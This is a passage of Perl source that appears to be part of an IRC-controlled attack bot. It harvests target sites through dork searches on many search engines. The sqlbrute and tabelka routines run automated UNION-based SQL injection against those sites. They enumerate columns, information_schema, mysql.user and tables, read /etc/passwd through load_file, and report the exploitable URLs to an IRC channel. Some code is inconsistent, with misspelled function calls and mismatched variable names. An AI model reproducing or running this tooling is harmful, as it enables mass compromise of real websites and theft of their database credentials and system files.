		my $ilse = ("http://search.ilse.nl/web?rid=NEXT&pagnum=".$b."&search_for=".key($key));
		my $Res = uery($ilse);
		while($Res =~ m/window.status='http:\/\/(.+?)\//g){
			if ($1 !~ /ilse/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub SnZ(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=1; $b<=1000; $b+=10){
		my $snz = ("http://searchnz.co.nz/search.aspx?q=".key($key)."&np=".$b);
		my $Res = query($snz);
		while ($Res =~ m/window.status='http:\/\/(.+?)\//g){
			if ($1 !~ /snz/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub gigablast(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=1; $b<=5000; $b+=10){
		my $gigablast = ("http://www.gigablast.com/search?s=".$b."&q=".key($key));
		my $Res = query($gigablast);
		while ($Res =~ m/href=http:\/\/(.+?)><font/g){
			if ($1 !~ /gigablast/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub tiscali(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=0; $b<=5000; $b+=10){
		my $tiscali = ("http://search.tiscali.it/?tiscalitype=web&collection=web&start=".$b."&q=".key($key));
		my $Res = query($tiscali);
		while ($Res =~ m/href=http:\/\/(.+?)><font/g){
			if ($1 !~ /tiscali/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub libero(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=1; $b<=1000; $b+=10){
		my $libero = ("http://ricerca.alice.it/ricerca?qs=".key($key)."&filter=1&site=&lr=&hits=1 0&offset=".$b);
		my $Res = query($libero);
		while ($Res =~ m/href=http:\/\/(.+?)><font/g){
			if ($1 !~ /libero/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub ixquic(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=1; $b<=1000; $b+=10){
		my $ixquic = ("http://s7-eu.ixquick.com/do/metasearch.pl?cmd=process_search&startat=".$b."&la nguage=italiano&qid=LHHHMSMONPLO&query=".key($key) ."&cat=web&rl=NONE&lui=italiano&ff=&rcount=");
		my $Res = query($ixquic);
		while ($Res =~ m/href=http:\/\/(.+?)><font/g){
			if ($1 !~ /ixquic/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub kvasir(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=1; $b<=1000; $b+=10){
		my $kvasir = ("http://www.kvasir.no/alle?searchRegion=country&offset=".$b."&y=21&searchExpr=".key($key)."&x=66");
		my $Res = query($kvasir);
		while ($res =~ m/<span class=\"?url\"?>http:\/\/(.+?)\<\/span>/g){
			if ($1 !~ /kvasir/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub szukacz(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=1; $b<=1000; $b+=10){
		my $szukacz = ("http://www.szukacz.pl/szukaj.aspx?ct=polska&pc=polska&enc=iso-8859-2&q=".key($key)."&start=".$b);
		my $Res = query($szukacz);
		while ($res =~ m/<span class=\"?url\"?>http:\/\/(.+?)\<\/span>/g){
			if ($1 !~ /szukacz/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub virgillio(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=1; $b<=1000; $b+=10){
		my $virgillio = ("http://ricerca.virgilio.it/ricerca?qs=".key($key)."&filter=1&site=&lr=&hits=10&offset=".$b);
		my $Res = query($virgillio);
		while ($res =~ m/<span class=\"?url\"?>http:\/\/(.+?)\<\/span>/g){
			if ($1 !~ /virgillio/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub aol(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=1; $b<=1000; $b+=10){
		my $aol = ("http://search.aol.co.uk/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
		my $Res = query($aol);
		while ($res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g) {
			if ($1 !~ /aol/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub os() {
    my $target=$_[0];
    my $re  = &query($target);
    while ($re =~ m/<br>OSTYPE:(.+?)\<br>/g) {
        $os = $1;
    }
}

sub query($) {
my $url = $_[0];
$url =~ s/http:\/\///;
my $host  = $url;
my $query = $url;
my $page  = "";
$host  =~ s/href=\"?http:\/\///;
$host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~ s/$host//;
if ( $query eq "" ) { $query = "/"; }
eval {
my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page = "@r";
close($sock);
};
return $page;
}
sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push( @l, $link, $host, $hdir );
    return @l;
}
sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
    return $dork;
}


sub calculate {
    my @calculate = ();
    my %visti = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visti{$element}++;
        push @calculate, $element;
    }
    return @calculate;
}
sub sqlbrute() {
			my $site=$_[0];
			my $columns=20;
my $cfin.="--";
my $cmn.= "+";
for ($column = 0 ; $column < $columns ; $column ++)
	{
	$union.=','.$column;
	$inyection.=','."0x6c6f67696e70776e7a";
    if ($column == 0)
      {
		  $inyection = '';
          $union = '';
      }
    $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cfin;
    $response=get($sql);
    if($response =~ /loginpwnz/)
		{
         $column ++;
         $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;
		 sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)14 $sql ");
         $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;
         $response=get($sql)or die("[-] Impossible to get Information_Schema\n");
         if($response =~ /loginpwnz/)
         	{
         	$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."information_schema.tables".$cfin;
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2SCHEMA15)14 $sql ");
         	}
         $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."mysql.user".$cfin;
         $response=get($sql)or die("[-] Impossible to get MySQL.User\n");
         if($response =~ /loginpwnz/)
         	{
         	$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."mysql.user".$cfin;
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2USER15)14 $sql ");
         	}
         else
         	{
         	}
	while ($loadcont < $column-1)
	   {
		$loadfile.=','.'load_file(0x2f6574632f706173737764)';
		$loadcont++;
	   }
	   $sql=$site."-1".$cmn."union".$cmn."select".$cmn."load_file(0x2f6574632f706173737764)".$loadfile.$cfin;
	$response=get($sql)or die("[-] Impossible to inject LOAD_FILE\n");
         if($response =~ /root:x:/)
         	{
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2Load File15)14 $sql ");
			}
         else
         	{
         	}
	          foreach $tabla(@tabele)
                {
                  chomp($tabla);
                  $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn.$tabla.$cfin;
				 $response=get($sql)or die("[-] Impossible to get tables\n");
                  if($response =~ /loginpwnz/)
                    {
                    $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn.$tabla.$cfin;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2Tabel15)14 $sql ");
					&tabelka($site,$tabla);
                    }
                }
		}
	}			
}

sub tabelka() {
			my $site=$_[0];
			my $tabla=$_[1];
			my $cfin.="--";
			my $cmn.= "+";
            chomp($tabla);
            foreach $columna(@kolumny)
            {
             chomp($columna);
             $sql=$site."-1".$cmn."union".$cmn."select".$cmn."concat(0x6c6f67696e70776e7a,0x3a,$columna)".$inyection.$cmn."from".$cmn.$tabla.$cfin;
             $response=get($sql)or die("[-] Impossible to get columns\n");
             if ($response =~ /loginpwnz/)
                {
				sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15) (2SQLi Vuln15)14 $site 15(2Kolom15)14 $columna 15(2Tabel15)14 $tabla ");
                }
            }
        
}
sub nick {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub notice {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}

sub join {
sendraw("JOIN $_[0]");
}

sub part {
sendraw("PART $_[0]");
}

sub quit {
sendraw("QUIT $_[0]");
exit;
}
